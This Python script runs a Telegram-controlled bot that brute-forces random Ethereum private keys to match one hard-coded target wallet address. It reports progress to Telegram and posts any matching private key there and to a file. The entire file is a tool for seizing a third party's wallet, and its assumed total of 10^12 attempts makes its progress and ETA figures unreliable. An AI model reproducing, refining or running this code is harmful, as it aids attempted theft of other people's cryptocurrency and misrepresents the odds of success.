import secrets
from eth_account import Account
import time
import requests
import os
import threading
from dotenv import load_dotenv
from datetime import datetime, timedelta
from flask import Flask
from threading import Thread

# === Flask Web Server to Keep Alive ===
app = Flask('')

@app.route('/')
def home():
    return "Bot is running..."

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# === Load .env config ===
load_dotenv()

# ====== CONFIGURATION ======
BOT_TOKEN = os.getenv("TOKEN_BOT")
CHAT_ID_LIST = os.getenv("TELEGRAM_CHAT_ID").split(",")
TARGET = "0xb20a608c624Ca5003905aA834De7156C68b2E1d0".lower()
BATCH_SIZE = 10_000
LOG_INTERVAL = 1000
REPORT_INTERVAL = 10_000
ESTIMATED_TOTAL_ATTEMPTS = 1_000_000_000_000
# ===========================

# Runtime state
pause_flag = False
stop_flag = False

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    for chat_id in CHAT_ID_LIST:
        payload = {
            "chat_id": chat_id.strip(),
            "text": message,
            "parse_mode": "HTML"
        }
        try:
            requests.post(url, data=payload)
        except Exception as e:
            print(f"Error sending Telegram message: {e}")

def generate_wallet():
    priv = secrets.token_hex(32)
    private_key = "0x" + priv
    acct = Account.from_key(private_key)
    return acct.address.lower(), private_key

def check_control_files():
    global pause_flag, stop_flag
    pause_flag = os.path.exists("pause.txt")
    stop_flag = os.path.exists("exit.txt")

def handle_commands():
    global pause_flag, stop_flag
    offset = None
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"

    while True:
        try:
            params = {"timeout": 10}
            if offset:
                params["offset"] = offset

            resp = requests.get(url, params=params, timeout=15)
            data = resp.json()

            if data.get("ok"):
                for update in data["result"]:
                    offset = update["update_id"] + 1
                    message = update.get("message", {})
                    chat_id = str(message.get("chat", {}).get("id"))
                    text = message.get("text", "").strip().lower()

                    if chat_id not in [x.strip() for x in CHAT_ID_LIST]:
                        continue

                    if text == "/pause":
                        pause_flag = True
                        send_telegram_message("⏸️ Brute force paused.")

                    elif text == "/resume":
                        pause_flag = False
                        send_telegram_message("▶️ Brute force resumed.")

                    elif text == "/stop":
                        stop_flag = True
                        send_telegram_message("🛑 Brute force stopped.")

        except Exception as e:
            print(f"Command listener error: {e}")
        time.sleep(5)

def main():
    global pause_flag, stop_flag
    total_attempts = 0
    send_telegram_message(f"🚀 Brute force started.\n🎯 Target: <code>{TARGET}</code>")

    overall_start_time = time.time()

    # Start command listener
    threading.Thread(target=handle_commands, daemon=True).start()

    while not stop_flag:
        check_control_files()
        if pause_flag:
            print("⏸️ Paused... waiting to resume.")
            time.sleep(5)
            continue

        batch_start_time = time.time()
        batch_attempts = 0

        while batch_attempts < BATCH_SIZE and not stop_flag:
            check_control_files()
            if pause_flag:
                break

            address, priv_key = generate_wallet()
            batch_attempts += 1
            total_attempts += 1

            if total_attempts % LOG_INTERVAL == 0:
                elapsed = time.time() - overall_start_time
                now = datetime.utcnow().strftime("%H:%M:%S")
                speed = total_attempts / elapsed
                remaining = ESTIMATED_TOTAL_ATTEMPTS - total_attempts
                eta = datetime.utcnow() + timedelta(seconds=(remaining / speed if speed else 0))
                print(f"[{total_attempts}] {address} | Speed: {speed:.2f} a/s | ETA: {eta.strftime('%Y-%m-%d %H:%M:%S')}")

            if address == TARGET:
                msg = (
                    f"<b>✅ MATCH FOUND!</b>\n"
                    f"🔐 Address: <code>{address}</code>\n"
                    f"🔑 Private Key: <code>{priv_key}</code>\n"
                    f"🔁 Attempt: {total_attempts}"
                )
                send_telegram_message(msg)
                with open("match_found.txt", "w") as f:
                    f.write(f"Address: {address}\nPrivate Key: {priv_key}\nAttempt: {total_attempts}\n")
                return

        batch_elapsed = time.time() - batch_start_time
        overall_elapsed = time.time() - overall_start_time
        speed = total_attempts / overall_elapsed
        eta = datetime.utcnow() + timedelta(seconds=((ESTIMATED_TOTAL_ATTEMPTS - total_attempts) / speed if speed else 0))

        send_telegram_message(
            f"ℹ️ Progress Report:\n"
            f"🔁 Total Attempts: <b>{total_attempts}</b>\n"
            f"⚡ Speed: {speed:.2f} a/s\n"
            f"⌛ ETA: <b>{eta.strftime('%Y-%m-%d %H:%M:%S UTC')}</b>\n"
            f"🎯 Target: <code>{TARGET}</code>"
        )

    print("🛑 Stopped by command or exit.txt")

# === Entry point ===
if __name__ == "__main__":
    keep_alive()
    main()
